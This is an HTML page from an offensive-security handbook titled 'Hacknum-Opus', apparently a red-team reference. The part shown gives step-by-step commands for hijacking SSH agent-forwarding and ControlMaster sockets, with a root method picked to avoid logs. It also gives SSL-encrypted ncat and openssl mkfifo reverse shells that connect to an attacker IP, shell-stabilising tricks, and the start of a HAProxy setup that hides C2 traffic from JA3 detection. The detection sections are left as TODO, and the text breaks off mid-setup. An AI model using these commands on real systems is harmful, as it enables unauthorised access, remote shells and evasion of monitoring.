<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js light">
    <head>

        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Hacknum-Opus</title>
                <meta name="robots" content="noindex" />
                

        <!-- Custom HTML head -->
        

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

                <link rel="icon" href="favicon.svg">
                        <link rel="shortcut icon" href="favicon.png">
                <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
                <link rel="stylesheet" href="css/print.css" media="print">
        
        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
                <link rel="stylesheet" href="fonts/fonts.css">
        
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        
            </head>
    <body>
    <div id="body-container">
        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var html = document.querySelector('html');
            var sidebar = null;
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded "><a href="SUMMARY.html"><strong aria-hidden="true">1.</strong> Table of Contents</a></li><li class="chapter-item expanded "><a href="SSH_HIJACKING_SUMMARY.html"><strong aria-hidden="true">2.</strong> SSH Hijacking</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="hijacking_ssh-agent_forwarding.html"><strong aria-hidden="true">2.1.</strong> SSH-Agent Forwarding</a></li><li class="chapter-item expanded "><a href="hijacking_ssh_controlmaster.html"><strong aria-hidden="true">2.2.</strong> ControlMaster</a></li></ol></li><li class="chapter-item expanded "><a href="REVERSE_SHELLS_SUMMARY.html"><strong aria-hidden="true">3.</strong> Reverse Shells</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="netcat_ssl.html"><strong aria-hidden="true">3.1.</strong> Netcat with SSL</a></li><li class="chapter-item expanded "><a href="upgrade_magic.html"><strong aria-hidden="true">3.2.</strong> Upgrading Shells with Magic</a></li></ol></li><li class="chapter-item expanded "><a href="C2_SUMMARY.html"><strong aria-hidden="true">4.</strong> C2</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="C2_STEALTH_SUMMARY.html"><strong aria-hidden="true">4.1.</strong> Stealth</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="ja3_obfuscation.html"><strong aria-hidden="true">4.1.1.</strong> JA3 Obfuscation</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="WEB_SUMMARY.html"><strong aria-hidden="true">5.</strong> Web</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="GITLAB_SUMMARY.html"><strong aria-hidden="true">5.1.</strong> Gitlab</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="gitlab-backdoor-user.html"><strong aria-hidden="true">5.1.1.</strong> Adding a Backdoor User</a></li><li class="chapter-item expanded "><a href="cve-2021-22205.html"><strong aria-hidden="true">5.1.2.</strong> ExifTool DjVu (CVE-2021-22205)</a></li><li class="chapter-item expanded "><a href="csproj.html"><strong aria-hidden="true">5.1.3.</strong> Visual Studio CSPROJ Reverse Shell</a></li></ol></li><li class="chapter-item expanded "><a href="PHP_SUMMARY.html"><strong aria-hidden="true">5.2.</strong> PHP</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="php_webshell_oneline.html"><strong aria-hidden="true">5.2.1.</strong> Basic PHP Webshell Oneliner</a></li><li class="chapter-item expanded "><a href="php_filter_gadget_chain.html"><strong aria-hidden="true">5.2.2.</strong> PHP Filter Gadget Chain</a></li></ol></li><li class="chapter-item expanded "><a href="APACHE_SUMMARY.html"><strong aria-hidden="true">5.3.</strong> Apache</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="cve-2023-50164.html"><strong aria-hidden="true">5.3.1.</strong> Apache Struts RCE (CVE-2023-50164)</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="LINUX_SUMMARY.html"><strong aria-hidden="true">6.</strong> Linux</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="LINUX_PRIVESC_SUMMARY.html"><strong aria-hidden="true">6.1.</strong> Privilege Escalation</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="linux_gtfobins.html"><strong aria-hidden="true">6.1.1.</strong> SUDO/SUID/etc</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="WINDOWS_SUMMARY.html"><strong aria-hidden="true">7.</strong> Windows</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="AMSI_BYPASS_SUMMARY.html"><strong aria-hidden="true">7.1.</strong> AMSI Bypass</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="powershell_amsi_bypass.html"><strong aria-hidden="true">7.1.1.</strong> Powershell AMSI Bypass</a></li></ol></li><li class="chapter-item expanded "><a href="WINDOWS_STEALTH_SUMMARY.html"><strong aria-hidden="true">7.2.</strong> Stealth</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="windows_reflective_pe_loader.html"><strong aria-hidden="true">7.2.1.</strong> Reflective PE Loader</a></li></ol></li><li class="chapter-item expanded "><a href="WINDOWS_LATERAL_MOVEMENT_SUMMARY.html"><strong aria-hidden="true">7.3.</strong> Lateral Movement</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="psexec.html"><strong aria-hidden="true">7.3.1.</strong> PSExec</a></li><li class="chapter-item expanded "><a href="mof_upload.html"><strong aria-hidden="true">7.3.2.</strong> MOF Upload</a></li><li class="chapter-item expanded "><a href="winrm.html"><strong aria-hidden="true">7.3.3.</strong> WinRM</a></li><li class="chapter-item expanded "><a href="printnightmare.html"><strong aria-hidden="true">7.3.4.</strong> PrintNightmare (CVE-2021-1675)</a></li></ol></li><li class="chapter-item expanded "><a href="WINDOWS_PERSISTENCE_SUMMARY.html"><strong aria-hidden="true">7.4.</strong> Persistence</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="invisreg.html"><strong aria-hidden="true">7.4.1.</strong> Invisible Registry Keys</a></li></ol></li><li class="chapter-item expanded "><a href="WINDOWS_PRIVESC_SUMMARY.html"><strong aria-hidden="true">7.5.</strong> Privilege Escalation</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="cve-2023-23397.html"><strong aria-hidden="true">7.5.1.</strong> Outlook Client (CVE-2023-23397)</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="ACTIVE_DIRECTORY_SUMMARY.html"><strong aria-hidden="true">8.</strong> Active Directory</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="sharpgpoabuse.html"><strong aria-hidden="true">8.1.</strong> SharpGPOAbuse</a></li><li class="chapter-item expanded "><a href="cert_template_abuse.html"><strong aria-hidden="true">8.2.</strong> Certificate Template Abuse</a></li><li class="chapter-item expanded "><a href="ACTIVE_DIRECTORY_VULNERABILITIES_SUMMARY.html"><strong aria-hidden="true">8.3.</strong> Vulnerabilities</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="zerologon.html"><strong aria-hidden="true">8.3.1.</strong> Zerologon (CVE-2020-1472)</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="IMPACT_SUMMARY.html"><strong aria-hidden="true">9.</strong> Impact</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="website_defacement.html"><strong aria-hidden="true">9.1.</strong> Website Defacement</a></li><li class="chapter-item expanded "><a href="gonnacope_(ransomware).html"><strong aria-hidden="true">9.2.</strong> GonnaCope</a></li><li class="spacer"></li></ol></li><li class="chapter-item expanded "><a href="contrib.html">Contributors</a></li></ol>            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="matrix">Matrix</button></li> 
                        </ul>
                                                <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                                            </div>

                    <h1 class="menu-title">Hacknum-Opus</h1>

                    <div class="right-buttons">
                                                <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                                                                        
                    </div>
                </div>

                                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="table-of-contents"><a class="header" href="#table-of-contents">Table of Contents</a></h1>
<ul>
<li><a href="./SUMMARY.html">Table of Contents</a></li>
<li><a href="SSH_HIJACKING_SUMMARY.html">SSH Hijacking</a>
<ul>
<li><a href="./hijacking_ssh-agent_forwarding.html">SSH-Agent Forwarding</a></li>
<li><a href="./hijacking_ssh_controlmaster.html">ControlMaster</a></li>
</ul>
</li>
<li><a href="./REVERSE_SHELLS_SUMMARY.html">Reverse Shells</a>
<ul>
<li><a href="./netcat_ssl.html">Netcat with SSL</a></li>
<li><a href="./upgrade_magic.html">Upgrading Shells with Magic</a></li>
</ul>
</li>
<li><a href="./C2_SUMMARY.html">C2</a>
<ul>
<li><a href="C2_STEALTH_SUMMARY.html">Stealth</a>
<ul>
<li><a href="ja3_obfuscation.html">JA3 Obfuscation</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="WEB_SUMMARY.html">Web</a>
<ul>
<li><a href="./GITLAB_SUMMARY.html">Gitlab</a>
<ul>
<li><a href="./gitlab-backdoor-user.html">Adding a Backdoor User</a></li>
<li><a href="./cve-2021-22205.html">ExifTool DjVu (CVE-2021-22205)</a></li>
<li><a href="./csproj.html">Visual Studio CSPROJ Reverse Shell</a></li>
</ul>
</li>
<li><a href="./PHP_SUMMARY.html">PHP</a>
<ul>
<li><a href="./php_webshell_oneline.html">Basic PHP Webshell Oneliner</a></li>
<li><a href="./php_filter_gadget_chain.html">PHP Filter Gadget Chain</a></li>
</ul>
</li>
<li><a href="./APACHE_SUMMARY.html">Apache</a>
<ul>
<li><a href="./cve-2023-50164.html">Apache Struts RCE (CVE-2023-50164)</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="./LINUX_SUMMARY.html">Linux</a>
<ul>
<li><a href="./LINUX_PRIVESC_SUMMARY.html">Privilege Escalation</a>
<ul>
<li><a href="./linux_gtfobins.html">SUDO/SUID/etc</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="./WINDOWS_SUMMARY.html">Windows</a>
<ul>
<li><a href="./AMSI_BYPASS_SUMMARY.html">AMSI Bypass</a>
<ul>
<li><a href="./powershell_amsi_bypass.html">Powershell AMSI Bypass</a></li>
</ul>
</li>
<li><a href="./WINDOWS_STEALTH_SUMMARY.html">Stealth</a>
<ul>
<li><a href="./windows_reflective_pe_loader.html">Reflective PE Loader</a></li>
</ul>
</li>
<li><a href="./WINDOWS_LATERAL_MOVEMENT_SUMMARY.html">Lateral Movement</a>
<ul>
<li><a href="./psexec.html">PSExec</a></li>
<li><a href="./mof_upload.html">MOF Upload</a></li>
<li><a href="./winrm.html">WinRM</a></li>
<li><a href="./printnightmare.html">PrintNightmare (CVE-2021-1675)</a></li>
</ul>
</li>
<li><a href="./WINDOWS_PERSISTENCE_SUMMARY.html">Persistence</a>
<ul>
<li><a href="./invisreg.html">Invisible Registry Keys</a></li>
</ul>
</li>
<li><a href="./WINDOWS_PRIVESC_SUMMARY.html">Privilege Escalation</a>
<ul>
<li><a href="./cve-2023-23397.html">Outlook Client (CVE-2023-23397)</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="./ACTIVE_DIRECTORY_SUMMARY.html">Active Directory</a>
<ul>
<li><a href="./sharpgpoabuse.html">SharpGPOAbuse</a></li>
<li><a href="./cert_template_abuse.html">Certificate Template Abuse</a></li>
<li><a href="./ACTIVE_DIRECTORY_VULNERABILITIES_SUMMARY.html">Vulnerabilities</a>
<ul>
<li><a href="./zerologon.html">Zerologon (CVE-2020-1472)</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="./IMPACT_SUMMARY.html">Impact</a>
<ul>
<li><a href="./website_defacement.html">Website Defacement</a></li>
<li><a href="./gonnacope_(ransomware).html">GonnaCope</a></li>
</ul>
</li>
</ul>
<hr />
<p><a href="./contrib.html">Contributors</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ssh-hijacking"><a class="header" href="#ssh-hijacking">SSH Hijacking</a></h1>
<ul>
<li><a href="./hijacking_ssh-agent_forwarding.html">SSH-Agent Forwarding</a></li>
<li><a href="./hijacking_ssh_controlmaster.html">ControlMaster</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ssh-hijacking-with-ssh-agent-forwarding"><a class="header" href="#ssh-hijacking-with-ssh-agent-forwarding">SSH Hijacking With SSH-Agent Forwarding</a></h1>
<h2 id="summary"><a class="header" href="#summary">Summary</a></h2>
<p>SSH-Agent is a utility that keeps track of a user's private keys and allows them to be used without having to repeat their passphrases on every connection. SSH agent forwarding is a mechanism that allows a user to use the SSH-Agent on an intermediate server as if it were their own local agent on their originating machine. This is useful in situations where a user might need to ssh from an intermediate host into another network segment, which can't be directly accessed from the originating machine. It has the advantage of not requiring the private key to be stored on the intermediate server and the user does not need to enter their passphrase more than once.</p>
<p>SSH Hijacking is when you take control over the existing SSH session using the socket that gets created. In this scenario, the user will be logged into the intermediate server that's handling the SSH-Agent. Due to the intermediate server assuming the logged in user has already entered the passphrase(s) for the target computers, this technique allows an attacker to log in to every system that trusts the intermediate server without knowing the passphrase to the private key file.</p>
<h2 id="prerequisites"><a class="header" href="#prerequisites">Prerequisites</a></h2>
<p>A client, intermediate server, and at least one target must be used for this attack, each one requires SSH to be installed and must support SSH-Agent Forwarding. The client must be logged into the intermediate server and has entered the passphrase at least once, and must not close their connection to the server.</p>
<h2 id="setup"><a class="header" href="#setup">Setup</a></h2>
<p>In this setup, there will be three hosts; client, intermediate, and target. The intermediate host will house the SSH-Agent forwarding. The public key needs to be installed on both intermediate and target. The keys can be generated and uploaded with the following commands on the client:</p>
<pre><code class="language-bash">ssh-keygen
ssh-copy-id -i /path/to/created/key.pub user@intermediate
ssh-copy-id -i /path/to/created/key.pub user@target
</code></pre>
<p>Next, SSH needs to be told to use a forwarded agent. Ensure the following is set in ~/.ssh/config:</p>
<pre><code class="language-config">ForwardAgent yes
</code></pre>
<p>Activate the agent and add the generated keys with the following commands on the client, ssh-add will prompt for the passphrase for the key:</p>
<pre><code class="language-bash">eval `ssh-agent`
ssh-add /path/to/created/key.pub
</code></pre>
<p>Now, on the intermediate server, the following must be set in /etc/ssh/sshd_config:</p>
<pre><code class="language-config">AllowAgentForwarding yes
</code></pre>
<p>The client must log into the intermediate server, and keep this connection alive. The client must also enter the passphrase at least once so that SSH-Agent will remember the client being authenticated, so it will not prompt for the passphrase during execution.</p>
<h2 id="execution"><a class="header" href="#execution">Execution</a></h2>
<h3 id="method-1---low-privileges"><a class="header" href="#method-1---low-privileges">Method 1 - Low Privileges</a></h3>
<p>This method only works if the user you have compromised has an active SSH session to the intermediate server, if you can not authenticate as the user that does have the session, then you will need root privileges.</p>
<p>Since you are effectively the user you have compromised, simply running the following commands will allow you to gain access to any target system that's been configured for SSH-Agent Forwarding for this user:</p>
<pre><code class="language-bash">ssh user@intermediate # On the client
ssh user@target # On the intermediate server
</code></pre>
<h4 id="indicators-of-compromise"><a class="header" href="#indicators-of-compromise">Indicators of Compromise</a></h4>
<p>TODO</p>
<h3 id="method-2---root-privileges"><a class="header" href="#method-2---root-privileges">Method 2 - Root Privileges</a></h3>
<p>One way to perform this method is simply to use the su or sudo command to become that user, and then following method 1. However, to avoid running these commands as they do populate logs on Linux by default, this method will outline how to do it from root alone <strong>FROM THE INTERMEDIATE SERVER</strong>.</p>
<p>The first step is to find an active SSH session as any user on the box, and fetching the environment variables from all of it's children PID's. This can be done with the following commands:</p>
<pre><code class="language-bash">ps aux | grep ssh  # Find the user who has an active session
pstree -p user | grep ssh # Find the list of PID's following that session
cat /proc/PID/environ | tr '\0' '\n' | grep &quot;SSH&quot;
</code></pre>
<p>If the output from the last command contains &quot;SSH_AUTH_SOCK&quot;, then it's value will likely work for this method. It should contain a file path to a socket, to abuse this as root (or if the file permissions on the socket are insecure somehow) then the following commands can be used:</p>
<pre><code class="language-bash">SSH_AUTH_SOCK=/tmp/ssh-randomstring/agent.number ssh-add -l
SSH_AUTH_SOCK=/tmp/ssh-randomstring/agent.number ssh user@target
</code></pre>
<h4 id="indicators-of-compromise-1"><a class="header" href="#indicators-of-compromise-1">Indicators of Compromise</a></h4>
<p>TODO</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="hijacking-ssh-with-controlmaster"><a class="header" href="#hijacking-ssh-with-controlmaster">Hijacking SSH With ControlMaster</a></h1>
<h2 id="summary-1"><a class="header" href="#summary-1">Summary</a></h2>
<p>ControlMaster is a feature that enables sharing of multiple SSH sessions over a single network connection. This functionality can be enabled for a given user by editing their local SSH configuration file in ~/.ssh/config. This will create a socket that can be used without authentication on the client.</p>
<h2 id="prerequisites-1"><a class="header" href="#prerequisites-1">Prerequisites</a></h2>
<p>A client must have SSH installed, with the ability to configure ControlMaster, and the connection must have been made at least once depending on the ControlPersist setting used.</p>
<h2 id="setup-1"><a class="header" href="#setup-1">Setup</a></h2>
<p>To configure ControlMaster, place the following into the clients local SSH config, located at ~/.ssh/config:</p>
<pre><code class="language-config">Host *
        ControlPath ~/.ssh/controlmaster/%r@%h:%p
        ControlMaster auto
        ControlPersist 10m
</code></pre>
<p>if ControlPersist is set to yes, it will never close even when the SSH connection is closed. Otherwise, it will last for the duration this is set to after the connection is closed.</p>
<h2 id="execution-1"><a class="header" href="#execution-1">Execution</a></h2>
<h3 id="method-1---using-the-controlmaster-socket"><a class="header" href="#method-1---using-the-controlmaster-socket">Method 1 - Using the ControlMaster Socket</a></h3>
<p>To abuse this, run the following command on the client to hijack the ControlMaster socket:</p>
<pre><code class="language-bash">ssh -S /home/user/.ssh/controlmaster/user\@target\:port user@target
</code></pre>
<h4 id="indicators-of-compromise-2"><a class="header" href="#indicators-of-compromise-2">Indicators of Compromise</a></h4>
<p>TODO</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="reverse-shells"><a class="header" href="#reverse-shells">Reverse Shells</a></h1>
<ul>
<li><a href="./netcat_ssl.html">Netcat with SSL</a></li>
<li><a href="./upgrade_magic.html">Upgrading Shells with Magic</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="netcat-with-ssl"><a class="header" href="#netcat-with-ssl">Netcat with SSL</a></h1>
<h2 id="summary-2"><a class="header" href="#summary-2">Summary</a></h2>
<p>This will outline how to use a normal netcat shell except the traffic is encrypted with SSL.</p>
<h2 id="prerequisites-2"><a class="header" href="#prerequisites-2">Prerequisites</a></h2>
<p>Any operating system that has NMAP support, as the ncat package is shipped with NMAP.</p>
<h2 id="setup-2"><a class="header" href="#setup-2">Setup</a></h2>
<p>Install NMAP and ensure the ncat command is present</p>
<h2 id="execution-2"><a class="header" href="#execution-2">Execution</a></h2>
<h3 id="method-1---reverse-shell-listener-linuxmac"><a class="header" href="#method-1---reverse-shell-listener-linuxmac">Method 1 - Reverse Shell Listener Linux/Mac</a></h3>
<p>Start up the reverse shell listener with the following command:</p>
<pre><code class="language-bash">ncat --ssl -lvnp &lt;port&gt;
</code></pre>
<p>If the target has ncat as well, run the following command on the target:</p>
<pre><code class="language-bash">ncat --ssl &lt;attacker ip&gt; &lt;attcker port&gt;
</code></pre>
<p>Otherwise, if they have openssl on linux/mac, use the following command:</p>
<pre><code class="language-bash">rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | openssl s_client -connect &lt;attacker ip&gt;:&lt;attacker port&gt; 2&gt;&amp;1 &gt; /tmp/f &amp; disown
</code></pre>
<h4 id="indicators-of-compromise-3"><a class="header" href="#indicators-of-compromise-3">Indicators of Compromise</a></h4>
<p>TODO</p>
<h3 id="method-2---reverse-shell-listener-windows"><a class="header" href="#method-2---reverse-shell-listener-windows">Method 2 - Reverse Shell Listener Windows</a></h3>
<p>I highly recommend you use the following command, but if you don't want or need <code>rlwrap</code>, simply omit it from the following command:</p>
<pre><code class="language-bash">rlwrap ncat --ssl -lvnp &lt;port&gt;
</code></pre>
<p>If the target has ncat as well, run the following command on the target:</p>
<pre><code class="language-bash">ncat --ssl &lt;attacker ip&gt; &lt;attcker port&gt;
</code></pre>
<p>Otherwise, you can use <a href="https://github.com/nukingdragons/RevShells">these</a> powershell reverse shells, either &quot;TCPReverseSSL-AddType&quot; or &quot;TCPReverseShell-Reflective&quot; (AddType drops stuff to disk, reflective is less portable and may require tinkering), and then run them through a powershell cradle or otherwise to fetch a reverse shell.</p>
<h4 id="indicators-of-compromise-4"><a class="header" href="#indicators-of-compromise-4">Indicators of Compromise</a></h4>
<p>TODO</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="upgrading-shells-with-magic"><a class="header" href="#upgrading-shells-with-magic">Upgrading Shells with Magic</a></h1>
<h2 id="summary-3"><a class="header" href="#summary-3">Summary</a></h2>
<p>When using a raw shell, using netcat or something similar, usually this shell does not have an associated TTY, and can be killed accidentally with Ctrl+C. There are a few ways to fix both of these issues to stabilize the shell.</p>
<h2 id="prerequisites-3"><a class="header" href="#prerequisites-3">Prerequisites</a></h2>
<p>Some form of raw shell, C2 frameworks won't work with the magic portion, but may work with the TTY portion.</p>
<h2 id="setup-3"><a class="header" href="#setup-3">Setup</a></h2>
<p>Obtain a shell from a linux or mac based host through some means. If you have a windows shell, then fetch another by wrapping your listener with the <code>rlwrap</code> command. That's the best you'll get on Windows.</p>
<h2 id="execution-3"><a class="header" href="#execution-3">Execution</a></h2>
<h3 id="method-1---python-tty--magic"><a class="header" href="#method-1---python-tty--magic">Method 1 - Python TTY + Magic</a></h3>
<p>The first step is to obtain a working TTY in the shell using python, use the following command:</p>
<pre><code class="language-bash">python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
</code></pre>
<p>With a TTY created, we can perform &quot;Magic&quot; to upgrade the shell such that Ctrl+C, tab completion, etc, gets forwarded to the shell instead of being handled locally.</p>
<p>First, press Ctrl+Z to background the process. Then, run the following command and note down the <em>rows</em> and <em>columns</em> from the output:</p>
<pre><code class="language-bash">stty -a
</code></pre>
<p>Now, run the following command. The semicolon is important:</p>
<pre><code class="language-bash">stty raw -echo; fg
</code></pre>
<p>Press enter to regain control of the netcat shell, and then run the following commands:</p>
<pre><code class="language-bash">reset
export TERM=xterm
stty rows &lt;rows&gt; cols &lt;columns&gt;
</code></pre>
<p>Now, your reverse shell should function like any other shell, with tab completion and Ctrl+C support, you should also be able to clear the screen and use editors like vim. If you resize the terminal, you may need to update the rows and columns with <code>stty</code>.</p>
<h4 id="indicators-of-compromise-5"><a class="header" href="#indicators-of-compromise-5">Indicators of Compromise</a></h4>
<p>TODO</p>
<h3 id="method-2---script-tty---magic"><a class="header" href="#method-2---script-tty---magic">Method 2 - Script TTY  + Magic</a></h3>
<p>The first step is to obtain a working TTY in the shell using script, use the following command:</p>
<pre><code class="language-bash">script -q /dev/null -c /bin/bash
</code></pre>
<p>With a TTY created, we can perform &quot;Magic&quot; to upgrade the shell such that Ctrl+C, tab completion, etc, gets forwarded to the shell instead of being handled locally.</p>
<p>First, press Ctrl+Z to background the process. Then, run the following command and note down the <em>rows</em> and <em>columns</em> from the output:</p>
<pre><code class="language-bash">stty -a
</code></pre>
<p>Now, run the following command. The semicolon is important:</p>
<pre><code class="language-bash">stty raw -echo; fg
</code></pre>
<p>Press enter to regain control of the netcat shell, and then run the following commands:</p>
<pre><code class="language-bash">reset
export TERM=xterm
stty rows &lt;rows&gt; cols &lt;columns&gt;
</code></pre>
<p>Now, your reverse shell should function like any other shell, with tab completion and Ctrl+C support, you should also be able to clear the screen and use editors like vim. If you resize the terminal, you may need to update the rows and columns with <code>stty</code>.</p>
<h4 id="indicators-of-compromise-6"><a class="header" href="#indicators-of-compromise-6">Indicators of Compromise</a></h4>
<p>TODO</p>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="C2_STEALTH_SUMMARY.html">Stealth</a>
<ul>
<li><a href="ja3_obfuscation.html">JA3 Obfuscation</a></li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="ja3_obfuscation.html">JA3 Obfuscation</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="obfuscating-ja3-hashes-with-haproxy"><a class="header" href="#obfuscating-ja3-hashes-with-haproxy">Obfuscating JA3 Hashes with HAProxy</a></h1>
<h2 id="summary-4"><a class="header" href="#summary-4">Summary</a></h2>
<p>JA3 fingerprinting is a methodology for identifying attributes about a TLS connection and representing that information with an MD5 hash. These hashes can used to identify non-standard and potentially malicious traffic on a network. For example, the JA3 hash for most legitimate web traffic will be identical, whereas that of C2 traffic could either be unique and thus questionable, or exactly the same as other known C2 signatures and easily identifiable. While not exceptionally reliable, this is often used as a detection rule for intrusion detection systems (such as Suricata), or as an analytic for data driven monitoring and so should be obfuscated if possible.</p>
<p>The solution to the abnormal JA3 hashes produced by C2 traffic is to encapsulate it within HTTPS traffic directed towards a load balancer. The load balancer will then redirect the encapsulated C2 traffic to the C2 server, and when the C2 server reaches back to the load balancer it will once again get redirected under the guise of legitimate traffic. Since load balancers are very common technologies within web stacks, this will allow the JA3 hash of C2 traffic to blend in with normal web traffic. Furthermore, since this is a layer in front of the C2 server, it should be platform agnostic provided that the C2 platform supports HTTPS beaconing.</p>
<h2 id="prerequisites-4"><a class="header" href="#prerequisites-4">Prerequisites</a></h2>
<ul>
<li>Linux VM (Ideally with the apt package manager)</li>
<li>A C2 server (Can be running on the aforementioned Linux VM)</li>
</ul>
<h2 id="setup-4"><a class="header" href="#setup-4">Setup</a></h2>
<h3 id="initial-setup"><a class="header" href="#initial-setup">Initial Setup</a></h3>
<ol>
<li>Install haproxy via your distribution's package manager (<code>sudo apt-get install haproxy</code> with apt) </li>
<li>Open the haproxy configuration file at <code>/etc/haproxy/haproxy.cfg</code> using your text editor of choice</li>
</ol>
<pre><code>The file layout will look like this:
====

global
	xxxx
	xxxx

defaults
	xxxx
	xxxx

====

For the purposes of this guide, the non-tabbed portions (global and default) will be referred to as sections. You can ignore the two existing sections, but editing them may be useful for fine tuning.
</code></pre>
<ol start="3">
<li>At the bottom of the file, add a new section called <code>frontend myfrontend</code> and format it as laid out below. This will be the address and port that the load balancer is listening for traffic on.</li>
</ol>
<pre><code>defaults
	xxxx
	xxxx

frontend myfrontend
	default_backend myserver
	bind 0.0.0.0:8080
</code></pre>
<ol start="4">
<li>Save and exit the configuration file and restart HAProxy using <code>systemctl restart haproxy</code>, if you see any errors you likely have a syntax error.</li>
